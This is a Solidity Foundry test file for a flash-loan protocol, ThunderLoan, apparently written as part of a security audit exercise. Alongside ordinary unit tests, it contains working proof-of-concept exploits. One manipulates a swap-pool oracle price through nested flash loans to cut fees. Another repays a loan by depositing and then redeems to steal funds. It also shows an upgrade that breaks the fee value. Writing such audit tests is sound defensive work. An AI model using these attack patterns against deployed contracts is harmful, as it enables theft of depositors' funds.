// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest, ThunderLoan} from "./BaseTest.t.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {MockFlashLoanReceiver} from "../mocks/MockFlashLoanReceiver.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public view {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(
            address(thunderLoan.getAssetFromToken(tokenA)),
            address(assetToken)
        );
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThunderLoan.ThunderLoan__NotAllowedToken.selector,
                address(tokenA)
            )
        );
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        assertEq(
            mockFlashLoanReceiver.getBalanceDuring(),
            amountToBorrow + AMOUNT
        );
        assertEq(
            mockFlashLoanReceiver.getBalanceAfter(),
            AMOUNT - calculatedFee
        );
    }

    // function testCantRedeemAfterFlashLoan() public setAllowedToken hasDeposits {
    //     uint256 amountToBorrow = AMOUNT * 10;
    //     // uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

    //     vm.startPrank(user);
    //     tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
    //     thunderLoan.flashloan(
    //         address(mockFlashLoanReceiver),
    //         tokenA,
    //         amountToBorrow,
    //         ""
    //     );
    //     vm.stopPrank();

    //     vm.startPrank(liquidityProvider);
    //     thunderLoan.redeem(tokenA, type(uint256).max);
    //     vm.stopPrank();
    // }

    function testOracleManipulation() public {
        // 1. setup the contracts!
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswap = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswap), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswap), 100e18);
        BuffMockTSwap(tswap).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // 3. Fund the thunder loan
        /// set allow token
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        /// fund the thunder loan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 4. e are going to take out 2 flash loan
        //    a. To nuke the price of eth/tokenA in tswap
        //    b. to show that doing so greatly reduces the fees we pay on thunderloan

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        uint256 amountToBorrow = 50e18;

        MalliciousFlashLoanReceiver attacker = new MalliciousFlashLoanReceiver(
            tswap,
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(attacker), amountToBorrow * 2);
        thunderLoan.flashloan(address(attacker), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = attacker.feeOne() + attacker.feeTwo();
        console.log("Attack fee is : ", attackFee);
        console.log("Normal fee is : ", normalFeeCost);
    }

    function testUseDepositInsteadOfRepayToStealFunds()
        public
        setAllowedToken
        hasDeposits
    {
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        // tokenA.approve(address(thunderLoan), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > amountToBorrow + fee);
    }

    function testUpgradeBreaks() public {
        uint256 feeBefore = thunderLoan.getFee();

        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgrade = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgrade), "");
        vm.stopPrank();

        uint256 feeAfter = thunderLoan.getFee();

        console.log("fee before :", feeBefore);
        console.log("fee after :", feeAfter);

        assert(feeBefore != feeAfter);
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        // IERC20(token).transfer(address(thunderLoan), amount);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

contract MalliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tswap;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswap, address _thunderLoan, address _repayAddress) {
        thunderLoan = ThunderLoan(_thunderLoan);
        tswap = BuffMockTSwap(_tswap);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        if (!attacked) {
            // swap token a borrowed for eth
            // do again to show the differece
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswap.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(tswap), 50e18);
            // tanks the price!!
            tswap.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                wethBought,
                block.timestamp
            );

            // we call flshloan again!!
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        } else {
            // calculated fee and repay
            feeTwo = fee;
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        }
        return true;
    }
}
